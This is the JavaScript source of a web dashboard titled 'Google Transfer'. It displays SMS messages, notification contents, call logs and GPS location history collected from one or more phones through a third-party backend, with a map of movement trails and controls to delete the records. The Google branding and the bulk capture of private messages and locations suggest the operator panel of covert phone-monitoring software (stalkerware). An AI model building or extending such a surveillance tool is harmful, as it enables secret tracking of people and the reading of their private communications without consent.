/**
 * Google Transfer — Dashboard Application Logic
 * Google Material Design · Real-time device monitor
 */
(function () {
  'use strict';

  // ═══ STATE ═══════════════════════════════════════════════════════════════════
  const S = {
    serverUrl: localStorage.getItem('gt_url') || 'https://transfer-backend-ii1e.onrender.com/',
    apiToken: localStorage.getItem('gt_token') || '',
    device: localStorage.getItem('gt_device') || 'all',
    panel: 'overview',
    ws: null,
    wsRetries: 0,
    fetching: false,
    lastSynced: null,
    devices: [],
    data: { notifications: [], sms: [], callLogs: [], locations: [], messages: [] },
    stats: { notifications: 0, sms: 0, callLogs: 0, locations: 0, messages: 0, devices: 0 },
    filters: {
      notifSearch: '', notifApp: 'all',
      smsSearch: '', smsType: 'all',
      callType: 'all',
    },
    map: null,
    markersLayer: null,
    polylineLayer: null,
  };

  // ═══ DOM REFS ════════════════════════════════════════════════════════════════
  const $ = id => document.getElementById(id);
  const el = {
    deviceSelect: $('deviceSelect'),
    topbarTitle: $('topbarTitle'),
    connDot: $('connDot'),
    connText: $('connText'),
    connPill: $('connPill'),
    wsDot: $('wsDot'),
    wsText: $('wsText'),
    lastSync: $('lastSync'),
    refreshBtn: $('refreshBtn'),
    menuBtn: $('menuBtn'),
    sidebar: document.querySelector('.sidebar'),

    // KPI
    kpiNotif: $('kpiNotif'),
    kpiSms: $('kpiSms'),
    kpiCalls: $('kpiCalls'),
    kpiLoc: $('kpiLoc'),

    // Badges
    badgeNotif: $('badge-notifications'),
    badgeSms: $('badge-sms'),
    badgeCalls: $('badge-calls'),
    badgeLoc: $('badge-location'),

    // Overview
    activityFeed: $('activityFeed'),
    deviceInfoList: $('deviceInfoList'),

    // Notifications
    notifList: $('notifList'),
    notifSearch: $('notifSearch'),
    notifAppFilter: $('notifAppFilter'),
    clearNotifBtn: $('clearNotifBtn'),

    // SMS
    smsList: $('smsList'),
    smsSearch: $('smsSearch'),
    smsTypeFilter: $('smsTypeFilter'),
    clearSmsBtn: $('clearSmsBtn'),

    // Calls
    callList: $('callList'),
    callTypeFilter: $('callTypeFilter'),
    clearCallsBtn: $('clearCallsBtn'),
    callStats: $('callStats'),

    // Location
    centerMapBtn: $('centerMapBtn'),
    clearLocBtn: $('clearLocBtn'),
    locTableBody: $('locTableBody'),

    // Settings
    settingsUrl: $('settingsUrl'),
    settingsToken: $('settingsToken'),
    testConnBtn: $('testConnBtn'),
    saveSettingsBtn: $('saveSettingsBtn'),
    settingsTestResult: $('settingsTestResult'),

    toastContainer: $('toastContainer'),
  };

  // ═══ UTILS ═══════════════════════════════════════════════════════════════════

  function esc(str) {
    return String(str || '')
      .replace(/&/g, '&amp;').replace(/</g, '&lt;')
      .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  function formatTime(iso) {
    if (!iso) return '—';
    const d = new Date(iso);
    if (isNaN(d)) return iso;
    const now = new Date();
    const diff = (now - d) / 1000;
    if (diff < 60) return 'Just now';
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    if (diff < 604800) return d.toLocaleDateString([], { weekday: 'short', hour: '2-digit', minute: '2-digit' });
    return d.toLocaleDateString([], { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
  }

  function formatDur(secs) {
    secs = Number(secs) || 0;
    if (secs < 60) return `${secs}s`;
    return `${Math.floor(secs / 60)}m ${secs % 60}s`;
  }

  function formatPhone(num) {
    if (!num) return 'Unknown';
    const clean = String(num).replace(/\D/g, '');
    if (clean.length === 10) return `${clean.slice(0, 3)} ${clean.slice(3, 6)} ${clean.slice(6)}`;
    if (clean.length === 12) return `+${clean.slice(0, 2)} ${clean.slice(2, 7)} ${clean.slice(7)}`;
    return num;
  }

  function showToast(msg, type = 'info') {
    const t = document.createElement('div');
    t.className = `toast ${type}`;
    t.textContent = msg;
    el.toastContainer.appendChild(t);
    setTimeout(() => { t.style.opacity = '0'; t.style.transition = '0.3s'; setTimeout(() => t.remove(), 300); }, 3000);
  }

  // ═══ API ══════════════════════════════════════════════════════════════════════

  async function api(path, opts = {}) {
    const url = S.serverUrl.replace(/\/+$/, '') + path;
    const headers = { 'Content-Type': 'application/json', Authorization: `Bearer ${S.apiToken}`, ...(opts.headers || {}) };
    const res = await fetch(url, { ...opts, headers });
    if (!res.ok) {
      const body = await res.json().catch(() => null);
      throw new Error(body?.error || `HTTP ${res.status}`);
    }
    return res.json();
  }

  // ═══ CONNECTION STATUS ═══════════════════════════════════════════════════════

  function setConnStatus(state, text) {
    el.connDot.className = 'conn-dot' + (state === 'connected' ? ' connected' : state === 'error' ? ' error' : '');
    el.connText.textContent = text;
  }

  // ═══ WEBSOCKET ════════════════════════════════════════════════════════════════

  function connectWs() {
    if (S.ws && (S.ws.readyState === WebSocket.OPEN || S.ws.readyState === WebSocket.CONNECTING)) return;
    const wsUrl = S.serverUrl.replace(/^http/, 'ws').replace(/\/+$/, '') + '/ws';
    try {
      S.ws = new WebSocket(wsUrl);
      S.ws.onopen = () => {
        S.wsRetries = 0;
        el.wsDot.className = 'ws-dot live';
        el.wsText.textContent = 'Live';
        showToast('WebSocket connected — live updates active', 'success');
      };
      S.ws.onmessage = (e) => {
        try {
          const msg = JSON.parse(e.data);
          if (msg.event === 'data_updated') {
            loadData(true);
          }
        } catch { }
      };
      S.ws.onclose = () => {
        el.wsDot.className = 'ws-dot';
        el.wsText.textContent = 'Reconnecting…';
        const delay = Math.min(30000, 2000 * Math.pow(1.5, S.wsRetries++));
        setTimeout(connectWs, delay);
      };
      S.ws.onerror = () => {
        el.wsDot.className = 'ws-dot error';
        el.wsText.textContent = 'WS Error';
      };
    } catch { }
  }

  // ═══ DATA LOADING ════════════════════════════════════════════════════════════

  async function loadData(silent = false) {
    if (S.fetching) return;
    S.fetching = true;

    try {
      const health = await fetch(S.serverUrl.replace(/\/+$/, '') + '/health')
        .then(r => r.json()).catch(() => null);
      if (!health || health.status !== 'ok') throw new Error('Backend unreachable');

      setConnStatus('connected', `Connected (${health.database === 'connected' ? 'DB ✓' : 'DB ✗'})`);

      const dev = S.device;
      const [overview, devices, notifs, sms, calls, locs] = await Promise.all([
        api('/api/v1/data/overview').catch(() => null),
        api('/api/v1/data/devices').catch(() => ({ devices: [] })),
        api(`/api/v1/data/${encodeURIComponent(dev)}/notifications?limit=200`).catch(() => ({ notifications: [] })),
        api(`/api/v1/data/${encodeURIComponent(dev)}/sms?limit=200`).catch(() => ({ sms: [] })),
        api(`/api/v1/data/${encodeURIComponent(dev)}/callLogs?limit=200`).catch(() => ({ callLogs: [] })),
        api(`/api/v1/data/${encodeURIComponent(dev)}/locations?limit=200`).catch(() => ({ locations: [] })),
      ]);

      S.devices = devices.devices || [];
      S.data.notifications = notifs.notifications || [];
      S.data.sms = sms.sms || [];
      S.data.callLogs = calls.callLogs || [];
      S.data.locations = locs.locations || [];

      if (overview?.stats) {
        S.stats = {
          notifications: overview.stats.totalNotifications || S.data.notifications.length,
          sms: overview.stats.totalSms || S.data.sms.length,
          callLogs: overview.stats.totalCallLogs || S.data.callLogs.length,
          locations: overview.stats.totalLocations || S.data.locations.length,
          messages: overview.stats.totalMessages || 0,
          devices: overview.stats.totalDevices || S.devices.length,
        };
      }

      S.lastSynced = new Date();
      el.lastSync.textContent = `Updated: ${S.lastSynced.toLocaleTimeString()}`;

      updateDeviceDropdown();
      updateKpis();
      updateBadges();

      // Render active panel
      renderActivePanel();

    } catch (e) {
      setConnStatus('error', 'Disconnected');
      if (!silent) showToast('Connection failed: ' + e.message, 'error');
    } finally {
      S.fetching = false;
    }
  }

  // ═══ KPI & BADGES ════════════════════════════════════════════════════════════

  function updateKpis() {
    el.kpiNotif.textContent = S.stats.notifications;
    el.kpiSms.textContent = S.stats.sms;
    el.kpiCalls.textContent = S.stats.callLogs;
    el.kpiLoc.textContent = S.stats.locations;
  }

  function updateBadges() {
    el.badgeNotif.textContent = S.data.notifications.length || '';
    el.badgeSms.textContent = S.data.sms.length || '';
    el.badgeCalls.textContent = S.data.callLogs.length || '';
    el.badgeLoc.textContent = S.data.locations.length || '';
  }

  // ═══ DEVICE DROPDOWN ═════════════════════════════════════════════════════════

  function updateDeviceDropdown() {
    const current = el.deviceSelect.value;
    el.deviceSelect.innerHTML = '<option value="all">All Devices</option>' +
      S.devices.map(d => `<option value="${esc(d.deviceId)}">${esc(d.deviceId.slice(0, 20))} (${d.messageCount || 0}m, ${d.locationCount || 0}l)</option>`).join('');
    if (S.devices.some(d => d.deviceId === current) || current === 'all') {
      el.deviceSelect.value = current;
    }
  }

  // ═══ RENDER ACTIVE PANEL ═════════════════════════════════════════════════════

  function renderActivePanel() {
    switch (S.panel) {
      case 'overview': renderOverview(); break;
      case 'notifications': renderNotifications(); break;
      case 'sms': renderSms(); break;
      case 'calls': renderCalls(); break;
      case 'location': renderLocation(); break;
    }
  }

  // ═══ OVERVIEW ════════════════════════════════════════════════════════════════

  function renderOverview() {
    // Activity feed — mix of last items from each type
    const items = [
      ...S.data.notifications.slice(0, 5).map(n => ({ icon: '🔔', title: n.title || n.appId, sub: n.body, time: n.timestamp })),
      ...S.data.sms.slice(0, 5).map(s => ({ icon: '💬', title: formatPhone(s.address), sub: s.body, time: s.timestamp })),
      ...S.data.callLogs.slice(0, 5).map(c => ({ icon: c.type === 'missed' ? '📵' : c.type === 'incoming' ? '📲' : '📤', title: formatPhone(c.number), sub: `${c.type} · ${formatDur(c.duration)}`, time: c.timestamp })),
      ...S.data.locations.slice(0, 3).map(l => ({ icon: '📍', title: `${Number(l.latitude).toFixed(4)}, ${Number(l.longitude).toFixed(4)}`, sub: `±${Math.round(l.accuracy || 0)}m accuracy`, time: l.capturedAt })),
    ].sort((a, b) => new Date(b.time) - new Date(a.time)).slice(0, 15);

    if (items.length === 0) {
      el.activityFeed.innerHTML = `<div class="empty-state"><div class="empty-icon">📡</div><p class="empty-title">No data yet</p><p class="empty-desc">Set up the app on your phone and start monitoring.</p></div>`;
    } else {
      el.activityFeed.innerHTML = items.map(i => `
        <div class="activity-item">
          <span class="activity-icon">${i.icon}</span>
          <div class="activity-body">
            <div class="activity-title">${esc(i.title)}</div>
            <div class="activity-sub">${esc(i.sub || '')}</div>
          </div>
          <span class="activity-time">${formatTime(i.time)}</span>
        </div>`).join('');
    }

    // Device info
    if (S.devices.length === 0) {
      el.deviceInfoList.innerHTML = `<p class="empty-desc">No devices synced yet.</p>`;
    } else {
      el.deviceInfoList.innerHTML = S.devices.map(d => `
        <div class="device-info-item">
          <div class="device-id">${esc(d.deviceId)}</div>
          <div class="device-stats">${d.messageCount || 0} msg · ${d.locationCount || 0} loc · Last: ${formatTime(d.lastActivity)}</div>
        </div>`).join('');
    }
  }

  // ═══ NOTIFICATIONS ═══════════════════════════════════════════════════════════

  function renderNotifications() {
    const q = S.filters.notifSearch.toLowerCase();
    const app = S.filters.notifApp;

    // Build app filter options
    const apps = [...new Set(S.data.notifications.map(n => n.appId).filter(Boolean))];
    const curApp = el.notifAppFilter.value;
    el.notifAppFilter.innerHTML = '<option value="all">All apps</option>' +
      apps.map(a => `<option value="${esc(a)}" ${a === curApp ? 'selected' : ''}>…${esc(a.split('.').slice(-1)[0])}</option>`).join('');

    const filtered = S.data.notifications.filter(n =>
      (app === 'all' || n.appId === app) &&
      (!q || (n.title || '').toLowerCase().includes(q) || (n.body || '').toLowerCase().includes(q) || (n.appId || '').toLowerCase().includes(q))
    );

    if (filtered.length === 0) {
      el.notifList.innerHTML = `<div class="empty-state"><div class="empty-icon">🔔</div><p class="empty-title">${q || app !== 'all' ? 'No matching notifications' : 'No notifications yet'}</p><p class="empty-desc">${q || app !== 'all' ? 'Try adjusting your filter.' : 'Notifications will appear here when synced.'}</p></div>`;
      return;
    }

    el.notifList.innerHTML = filtered.map(n => `
      <div class="notif-item">
        <div style="flex:1;min-width:0">
          <span class="app-chip">${esc((n.appId || '').split('.').slice(-1)[0])}</span>
          <div class="notif-title">${esc(n.title || '(no title)')}</div>
          <div class="notif-body">${esc(n.body || '')}</div>
        </div>
        <span class="notif-time">${formatTime(n.timestamp)}</span>
      </div>`).join('');
  }

  // ═══ SMS ══════════════════════════════════════════════════════════════════════

  function renderSms() {
    const q = S.filters.smsSearch.toLowerCase();
    const type = S.filters.smsType;

    const filtered = S.data.sms.filter(s =>
      (type === 'all' || s.type === type) &&
      (!q || (s.address || '').toLowerCase().includes(q) || (s.body || '').toLowerCase().includes(q))
    );

    if (filtered.length === 0) {
      el.smsList.innerHTML = `<div class="empty-state"><div class="empty-icon">💬</div><p class="empty-title">${q || type !== 'all' ? 'No matching SMS' : 'No SMS yet'}</p></div>`;
      return;
    }

    el.smsList.innerHTML = filtered.map(s => `
      <div class="sms-item">
        <div style="flex:1;min-width:0">
          <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
            <span class="sms-number">${esc(formatPhone(s.address))}</span>
            <span class="type-badge type-${esc(s.type)}">${esc(s.type)}</span>
          </div>
          <div class="sms-body">${esc(s.body || '')}</div>
        </div>
        <span class="sms-time">${formatTime(s.timestamp)}</span>
      </div>`).join('');
  }

  // ═══ CALLS ═══════════════════════════════════════════════════════════════════

  function renderCalls() {
    const type = S.filters.callType;
    const filtered = type === 'all' ? S.data.callLogs : S.data.callLogs.filter(c => c.type === type);

    // Stats
    const inc = S.data.callLogs.filter(c => c.type === 'incoming').length;
    const out = S.data.callLogs.filter(c => c.type === 'outgoing').length;
    const miss = S.data.callLogs.filter(c => c.type === 'missed').length;
    el.callStats.innerHTML = `
      <div class="call-stat-chip stat-incoming">📲 ${inc} Incoming</div>
      <div class="call-stat-chip stat-outgoing">📤 ${out} Outgoing</div>
      <div class="call-stat-chip stat-missed">📵 ${miss} Missed</div>`;

    if (filtered.length === 0) {
      el.callList.innerHTML = `<div class="empty-state"><div class="empty-icon">📞</div><p class="empty-title">No call logs yet</p></div>`;
      return;
    }

    const icons = { incoming: '📲', outgoing: '📤', missed: '📵' };
    el.callList.innerHTML = filtered.map(c => `
      <div class="call-item">
        <div class="call-icon call-${esc(c.type)}">${icons[c.type] || '📞'}</div>
        <div style="flex:1;min-width:0">
          <div class="call-number">${esc(formatPhone(c.number))}</div>
          <div class="call-sub">${esc(c.type)} ${c.deviceId ? '· ' + esc(c.deviceId.slice(0, 12)) + '…' : ''}</div>
        </div>
        <div style="text-align:right">
          <div class="call-duration">${formatDur(c.duration)}</div>
          <div class="call-time">${formatTime(c.timestamp)}</div>
        </div>
      </div>`).join('');
  }

  // ═══ LOCATION ════════════════════════════════════════════════════════════════

  function initMap() {
    if (S.map || !window.L) return;
    S.map = L.map('locationMap', { zoomControl: true })
      .setView([20.5937, 78.9629], 5);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      maxZoom: 19,
      attribution: '© OpenStreetMap',
    }).addTo(S.map);
    S.markersLayer = L.layerGroup().addTo(S.map);
  }

  function renderLocation() {
    initMap();
    if (!S.map) return;

    S.markersLayer.clearLayers();
    if (S.polylineLayer) { S.map.removeLayer(S.polylineLayer); S.polylineLayer = null; }

    const locs = S.data.locations;

    if (locs.length === 0) {
      el.locTableBody.innerHTML = `<tr><td colspan="6" class="table-empty">No location data yet.</td></tr>`;
      return;
    }

    const sorted = [...locs].sort((a, b) => new Date(a.capturedAt) - new Date(b.capturedAt));
    const latLngs = [];

    sorted.forEach((loc, i) => {
      const ll = [loc.latitude, loc.longitude];
      latLngs.push(ll);
      const isLatest = i === sorted.length - 1;
      const color = isLatest ? '#34A853' : '#4285F4';
      const icon = L.divIcon({
        className: '',
        html: `<div style="width:${isLatest ? 14 : 10}px;height:${isLatest ? 14 : 10}px;background:${color};border:2px solid #fff;border-radius:50%;box-shadow:0 0 6px ${color}"></div>`,
        iconSize: [isLatest ? 14 : 10, isLatest ? 14 : 10],
        iconAnchor: [isLatest ? 7 : 5, isLatest ? 7 : 5],
      });
      L.marker(ll, { icon }).bindPopup(`
        <b>${isLatest ? '📍 Latest' : '📍 Location'}</b><br>
        Device: ${esc(loc.deviceId || '')}<br>
        ${Number(loc.latitude).toFixed(6)}, ${Number(loc.longitude).toFixed(6)}<br>
        Accuracy: ±${Math.round(loc.accuracy || 0)}m<br>
        ${formatTime(loc.capturedAt)}`).addTo(S.markersLayer);
    });

    if (latLngs.length > 1) {
      S.polylineLayer = L.polyline(latLngs, { color: '#4285F4', weight: 2, opacity: 0.6, dashArray: '5,8' }).addTo(S.map);
    }
    if (latLngs.length) S.map.fitBounds(L.latLngBounds(latLngs), { padding: [30, 30], maxZoom: 15 });

    // Table
    el.locTableBody.innerHTML = locs.map(l => `
      <tr>
        <td>${formatTime(l.capturedAt)}</td>
        <td class="mono">${Number(l.latitude).toFixed(6)}</td>
        <td class="mono">${Number(l.longitude).toFixed(6)}</td>
        <td>±${Math.round(l.accuracy || 0)}m</td>
        <td><span style="font-size:11px;font-family:monospace;color:var(--text-disabled)">${esc((l.deviceId || '').slice(0, 14))}…</span></td>
        <td><button class="locate-btn" onclick="window._locateOn(${l.latitude},${l.longitude})">Locate</button></td>
      </tr>`).join('');

    window._locateOn = (lat, lng) => {
      if (S.map) S.map.flyTo([lat, lng], 16, { duration: 1 });
    };
  }

  // ═══ PANEL SWITCHING ══════════════════════════════════════════════════════════

  const panelTitles = {
    overview: 'Overview', notifications: 'Notifications', sms: 'SMS Messages',
    calls: 'Call Logs', location: 'Location History', settings: 'Settings',
  };

  function switchPanel(id) {
    S.panel = id;
    // Update nav
    document.querySelectorAll('.nav-item').forEach(btn => {
      btn.classList.toggle('active', btn.dataset.panel === id);
    });
    // Show panel
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    const target = document.getElementById(`panel-${id}`);
    if (target) target.classList.add('active');

    el.topbarTitle.textContent = panelTitles[id] || id;

    // If map panel, fix size
    if (id === 'location' && S.map) {
      setTimeout(() => S.map.invalidateSize(), 120);
      renderLocation();
    }
    if (id === 'notifications') renderNotifications();
    if (id === 'sms') renderSms();
    if (id === 'calls') renderCalls();
    if (id === 'overview') renderOverview();
    if (id === 'settings') {
      el.settingsUrl.value = S.serverUrl;
      el.settingsToken.value = S.apiToken;
    }
  }

  // ═══ CLEAR ACTIONS ════════════════════════════════════════════════════════════

  async function clearData(type) {
    const labels = { notifications: 'notifications', sms: 'SMS messages', callLogs: 'call logs', locations: 'location history' };
    if (!confirm(`Delete all ${labels[type] || type} for ${S.device === 'all' ? 'ALL devices' : S.device}?`)) return;
    try {
      await api(`/api/v1/data/${encodeURIComponent(S.device)}/${type}`, { method: 'DELETE' });
      showToast(`${labels[type]} cleared`, 'success');
      loadData(true);
    } catch (e) {
      showToast(`Failed: ${e.message}`, 'error');
    }
  }

  // ═══ SETTINGS ════════════════════════════════════════════════════════════════

  async function testConnection() {
    const url = el.settingsUrl.value.trim().replace(/\/+$/, '');
    const token = el.settingsToken.value.trim();
    const res = el.settingsTestResult;
    res.className = 'test-result';
    res.textContent = 'Testing…';
    try {
      const health = await fetch(`${url}/health`).then(r => r.json());
      const authRes = await fetch(`${url}/api/v1/data/devices`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      if (!authRes.ok) {
        res.className = 'test-result error';
        res.textContent = `❌ Server OK but token rejected (${authRes.status})`;
      } else {
        res.className = 'test-result success';
        res.textContent = `✅ Connected! DB: ${health.database}`;
      }
    } catch (e) {
      res.className = 'test-result error';
      res.textContent = `❌ Cannot reach server: ${e.message}`;
    }
  }

  function saveSettings() {
    const url = el.settingsUrl.value.trim().replace(/\/+$/, '');
    const token = el.settingsToken.value.trim();
    if (!url) return showToast('Enter server URL', 'error');
    if (token.length < 32) return showToast('Token must be 32+ chars', 'error');
    S.serverUrl = url;
    S.apiToken = token;
    localStorage.setItem('gt_url', url);
    localStorage.setItem('gt_token', token);
    showToast('Settings saved — reconnecting…', 'success');
    connectWs();
    loadData(false);
    switchPanel('overview');
  }

  // ═══ EVENT BINDINGS ═══════════════════════════════════════════════════════════

  function setupEvents() {
    // Sidebar nav
    document.querySelectorAll('.nav-item').forEach(btn => {
      btn.addEventListener('click', () => switchPanel(btn.dataset.panel));
    });

    // Mobile menu
    el.menuBtn?.addEventListener('click', () => el.sidebar.classList.toggle('open'));

    // Refresh
    el.refreshBtn.addEventListener('click', () => loadData(false));

    // Device filter
    el.deviceSelect.addEventListener('change', (e) => {
      S.device = e.target.value;
      localStorage.setItem('gt_device', S.device);
      loadData(false);
    });

    // Notifications filters
    el.notifSearch.addEventListener('input', e => { S.filters.notifSearch = e.target.value; renderNotifications(); });
    el.notifAppFilter.addEventListener('change', e => { S.filters.notifApp = e.target.value; renderNotifications(); });
    el.clearNotifBtn.addEventListener('click', () => clearData('notifications'));

    // SMS filters
    el.smsSearch.addEventListener('input', e => { S.filters.smsSearch = e.target.value; renderSms(); });
    el.smsTypeFilter.addEventListener('change', e => { S.filters.smsType = e.target.value; renderSms(); });
    el.clearSmsBtn.addEventListener('click', () => clearData('sms'));

    // Call filters
    el.callTypeFilter.addEventListener('change', e => { S.filters.callType = e.target.value; renderCalls(); });
    el.clearCallsBtn.addEventListener('click', () => clearData('callLogs'));

    // Location
    el.centerMapBtn.addEventListener('click', () => {
      if (!S.map || S.data.locations.length === 0) return;
      const l = S.data.locations[0];
      S.map.flyTo([l.latitude, l.longitude], 15, { duration: 1 });
    });
    el.clearLocBtn.addEventListener('click', () => clearData('locations'));

    // Settings
    el.testConnBtn.addEventListener('click', testConnection);
    el.saveSettingsBtn.addEventListener('click', saveSettings);
  }

  // ═══ INIT ════════════════════════════════════════════════════════════════════

  function init() {
    setupEvents();
    // Pre-fill settings
    el.settingsUrl.value = S.serverUrl;
    el.settingsToken.value = S.apiToken;
    el.deviceSelect.value = S.device;

    // Connect WebSocket
    if (S.apiToken) connectWs();

    // Initial load
    loadData(false);

    // Auto-refresh every 30s
    setInterval(() => loadData(true), 30000);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
